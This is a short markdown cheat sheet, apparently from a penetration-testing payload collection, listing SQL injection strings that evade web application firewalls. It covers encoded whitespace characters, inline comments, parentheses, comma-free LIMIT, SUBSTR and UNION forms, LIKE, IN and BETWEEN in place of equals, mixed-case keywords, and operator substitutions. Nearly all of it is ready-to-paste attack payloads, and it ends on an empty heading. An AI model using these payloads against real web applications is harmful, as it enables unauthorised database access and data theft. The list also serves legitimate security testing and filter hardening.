# WAF Bypass

## No Space \(%20\) - bypass using whitespace alternatives

Bypass using whitespace alternatives

```text
?id=1%09and%091=1%09--
?id=1%0Dand%0D1=1%0D--
?id=1%0Cand%0C1=1%0C--
?id=1%0Band%0B1=1%0B--
?id=1%0Aand%0A1=1%0A--
?id=1%A0and%A01=1%A0--
```

## No Whitespace - bypass using comments

```text
?id=1/*comment*/and/**/1=1/**/--
```

## No Whitespace - bypass using parenthesis

```text
?id=(1)and(1)=(1)--
```

## No Comma - bypass using OFFSET, FROM and JOIN

```text
LIMIT 0,1         -> LIMIT 1 OFFSET 0
SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1).
SELECT 1,2,3,4    -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
```

## No Equal - bypass using LIKE/NOT IN/IN/BETWEEN

```text
?id=1 and substring(version(),1,1)like(5)
?id=1 and substring(version(),1,1)not in(4,3)
?id=1 and substring(version(),1,1)in(4,3)
?id=1 and substring(version(),1,1) between 3 and 4
```

## Blacklist using keywords - bypass using uppercase/lowercase

```text
?id=1 AND 1=1#
?id=1 AnD 1=1#
?id=1 aNd 1=1#
```

## Blacklist using keywords case insensitive - bypass using an equivalent operator

```text
AND   -> &&
OR    -> ||
=     -> LIKE,REGEXP, BETWEEN, not < and not >
> X   -> not between 0 and X
WHERE -> HAVING
```

## 

